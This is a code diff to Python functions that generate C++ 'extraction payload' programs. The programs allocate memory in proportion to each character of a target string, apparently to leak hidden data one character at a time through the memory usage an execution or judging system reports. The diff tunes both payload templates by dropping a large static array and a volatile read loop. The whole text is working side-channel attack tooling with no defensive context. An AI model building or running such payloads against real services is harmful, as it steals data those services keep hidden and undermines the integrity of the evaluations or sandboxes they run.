@@ -35,20 +35,14 @@ def get_character_extraction_payload(target, upper_bound_char=None):
 #include <vector>
 #include <cstdio>
 
-// Use a large fixed-size array to stabilize memory usage across different payload lengths.
-char target[1<<23] = "{target_str}";
+const char* target = "{target_str}";
 
 void Memory(int val) {{
+    // Allocate physical memory directly via std::vector zero-fill vectorization
     std::vector<char>((val + 1) * 1900000);
 }}
 
 int main() {{
-    // Force the compiler to not optimize out the target array
-    volatile char dummy = 0;
-    for(int i = (1<<23) - 100; i < (1<<23); ++i) {{
-        dummy ^= target[i];
-    }}
-
     char val;
     int i;
     for(i = 0; target[i] != '\\0'; ++i) {{
@@ -89,19 +83,14 @@ def get_lcp_extraction_payload(target, known_digits=None, query_idx=-1):
 #include <vector>
 #include <cstdio>
 
-char target[1<<23] = "{target_str}";
+const char* target = "{target_str}";
 
 void Memory(int val) {{
+    // Allocate physical memory directly via std::vector zero-fill vectorization
     std::vector<char>((val + 1) * 1900000);
 }}
 
 int main() {{
-    // Force the compiler to not optimize out the target array
-    volatile char dummy = 0;
-    for(int i = (1<<23) - 100; i < (1<<23); ++i) {{
-        dummy ^= target[i];
-    }}
-
     char val;
     int i;
     for(i = 0; true; ++i) {{
